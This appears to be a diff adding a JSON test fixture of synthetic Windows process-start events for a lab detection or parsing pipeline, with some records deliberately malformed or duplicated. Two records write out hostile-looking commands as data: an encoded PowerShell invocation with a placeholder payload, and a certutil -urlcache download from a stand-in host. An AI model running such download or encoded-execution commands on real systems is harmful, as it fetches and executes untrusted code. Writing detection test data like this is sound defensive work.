@@ -1,0 +1,81 @@
+[
+  {
+    "timestamp": "2026-10-26T10:12:00Z",
+    "user": "lab_analyst",
+    "computer": "LAB-WKS-01",
+    "action": "process_start",
+    "parent_image": "explorer.exe",
+    "event_uid": "p01",
+    "image": "powershell.exe",
+    "command_line": "powershell.exe -EncodedCommand LAB_ONLY_PLACEHOLDER"
+  },
+  {
+    "timestamp": "2026-10-26T10:12:00Z",
+    "user": "lab_analyst",
+    "computer": "LAB-WKS-01",
+    "action": "process_start",
+    "parent_image": "explorer.exe",
+    "event_uid": "p02",
+    "image": "certutil.exe",
+    "command_line": "certutil.exe -urlcache -f https://example.invalid/lab.bin lab.bin"
+  },
+  {
+    "timestamp": "2026-10-26T10:12:00Z",
+    "user": "lab_analyst",
+    "computer": "LAB-WKS-01",
+    "action": "process_start",
+    "parent_image": "explorer.exe",
+    "event_uid": "p03",
+    "image": "powershell.exe",
+    "command_line": "powershell.exe -File diagnostic.ps1"
+  },
+  {
+    "timestamp": "2026-10-26T10:12:00Z",
+    "user": "lab_analyst",
+    "computer": "LAB-WKS-01",
+    "action": "process_start",
+    "parent_image": "explorer.exe",
+    "event_uid": "p04",
+    "image": "certutil.exe",
+    "command_line": "certutil.exe -hashfile local.bin SHA256"
+  },
+  {
+    "timestamp": "2026-10-26T10:12:00Z",
+    "user": "lab_analyst",
+    "computer": "LAB-WKS-01",
+    "action": "process_start",
+    "parent_image": "explorer.exe",
+    "event_uid": "bad03",
+    "image": "powershell.exe"
+  },
+  {
+    "timestamp": "2026-10-26T10:12:00Z",
+    "user": "lab_analyst",
+    "computer": "",
+    "action": "process_start",
+    "parent_image": "explorer.exe",
+    "event_uid": "bad04",
+    "image": "notepad.exe",
+    "command_line": "notepad.exe"
+  },
+  {
+    "timestamp": "2026-10-26T10:12:00Z",
+    "user": "lab_analyst",
+    "computer": "LAB-WKS-01",
+    "action": "process_start",
+    "parent_image": "explorer.exe",
+    "event_uid": "conflict01",
+    "image": "notepad.exe",
+    "command_line": "notepad.exe"
+  },
+  {
+    "timestamp": "2026-10-26T10:12:00Z",
+    "user": "lab_analyst",
+    "computer": "LAB-WKS-01",
+    "action": "process_start",
+    "parent_image": "explorer.exe",
+    "event_uid": "conflict01",
+    "image": "notepad.exe",
+    "command_line": "notepad.exe another.txt"
+  }
+]
